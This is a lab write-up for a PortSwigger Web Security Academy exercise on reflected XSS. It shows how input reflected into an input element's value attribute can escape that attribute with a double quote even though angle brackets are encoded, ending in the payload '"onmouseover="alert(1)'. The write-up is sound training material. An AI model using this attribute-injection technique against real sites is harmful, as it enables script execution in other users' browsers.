# Reflected XSS into Attribute with Angle Brackets HTML-Encoded

## LAB - Reflected XSS into attribute with angle brackets HTML-encoded

## Lab Description

**Platform:** PortSwigger Web Security Academy
**Vulnerability:** Reflected Cross-Site Scripting (XSS)
**Context:** HTML attribute
**Status:** Completed

This lab contains a reflected XSS vulnerability in the blog's search functionality.

The objective is to perform a cross-site scripting attack by injecting an HTML attribute that calls the `alert()` function.

---

## Solution

### 1. Testing the Search Functionality

The application contains a search box:

```html
<input type="text" placeholder="Search the blog..." name="search">
```

I first entered a simple value:

```text
test123
```

After submitting the search, the value was reflected back into the page.

The resulting HTML contained:

```html
<input type="text" placeholder="Search the blog..." name="search" value="test123">
```

<p>
<img src="../images/Screenshot 1.png" alt="Searching for test123">
</p>

<hr>

This confirmed that the `search` parameter is controlled by the user and reflected into the HTML.

However, reflection alone does not necessarily mean there is an XSS vulnerability.

The important question is:

> **Where is my input being reflected, and in what HTML context?**

In this case, the input is reflected inside the `value` attribute of an `<input>` element.

---

### 2. Testing HTML Injection

Since the input was reflected into HTML, I tested whether I could inject a new HTML element using angle brackets.

I tried:

```html
<test123>
```

The application returned:

```html
<input type="text" placeholder="Search the blog..." name="search" value="&lt;test123&gt;">
```

<p>
<img src="../images/Screenshot2.png" alt="Testing angle brackets">
</p>

<hr>

The `<` and `>` characters were converted into HTML entities:

```text
<  →  &lt;
>  →  &gt;
```

This means the browser does not interpret `<test123>` as a new HTML element.

Instead, it remains text inside the existing `value` attribute.

---

### 3. Understanding the HTML Context

After seeing the encoded angle brackets, I checked the exact HTML context again:

```html
<input type="text" placeholder="Search the blog..." name="search" value="&lt;test123&gt;">
```

<p>
<img src="../images/screenshot3.png" alt="Angle brackets HTML encoded">
</p>

<hr>

This was the important discovery.

The application was encoding `<` and `>`.

Therefore, trying to inject something like:

```html
<script>alert(1)</script>
```

would not work because the browser would receive the characters as encoded text rather than a real HTML element.

So instead of trying to create a **new HTML tag**, I needed to work with the **existing `<input>` tag**.

The original HTML structure is:

```html
<input ... value="USER_INPUT">
```

My input is inside a quoted attribute:

```html
value="USER_INPUT"
```

The next thing to test was whether I could close that attribute using a double quote:

```text
"
```

If the quote is not encoded, I may be able to escape the `value` attribute and add another attribute.

---

### 4. Injecting an Event Handler

HTML elements can have event-handler attributes such as:

```html
onmouseover
onclick
onfocus
```

For example:

```html
<input value="" onmouseover="alert(1)">
```

Here:

```text
value=""
```

is the original attribute after closing it, and:

```text
onmouseover="alert(1)"
```

is the injected attribute.

I therefore tried:

```html
"onmouseover="alert(1)
```

The first double quote closes the original `value` attribute.

The rest creates a new `onmouseover` attribute.

Conceptually, the browser now sees:

```html
<input type="text" value="" onmouseover="alert(1)">
```

---

### 5. Successful XSS

After submitting the payload:

```html
"onmouseover="alert(1)
```

the injected `onmouseover` event was triggered by moving the mouse over the affected element.

The browser executed:

```javascript
alert(1)
```

<p>
<img src="../images/screenshot4.png" alt="Successful XSS alert">
</p>

<hr>

The `alert(1)` popup confirmed that the XSS payload was successfully executed.

---

## Key Takeaway

The main lesson from this lab is to identify the **HTML context** before choosing an XSS payload.

The application reflected the search input here:

```html
value="USER_INPUT"
```

At first, I tried using angle brackets to inject a new HTML element:

```html
<test123>
```

But the application encoded them:

```text
<  →  &lt;
>  →  &gt;
```

So injecting a new tag was not possible.

Instead, I focused on the existing attribute:

```html
value="USER_INPUT"
```

The double quote was not encoded, so it could be used to escape the existing attribute:

```text
"
```

Then I could inject an event handler:

```html
"onmouseover="alert(1)
```

The attack flow was:

```text
User input
    ↓
search parameter
    ↓
Reflected into HTML
    ↓
value="USER_INPUT"
    ↓
Angle brackets are encoded
    ↓
Cannot inject a new HTML tag
    ↓
Close the existing attribute with "
    ↓
Inject an event-handler attribute
    ↓
onmouseover="alert(1)"
    ↓
JavaScript executes
```

## Final Payload

```html
"onmouseover="alert(1)
```

## Vulnerability Summary

**Source:**

```text
search parameter
```

**Reflection point:**

```html
<input ... value="USER_INPUT">
```

**Weakness:**

The application encoded angle brackets but allowed the double quote to break out of the existing HTML attribute.

**Result:**

Reflected XSS through HTML attribute injection.
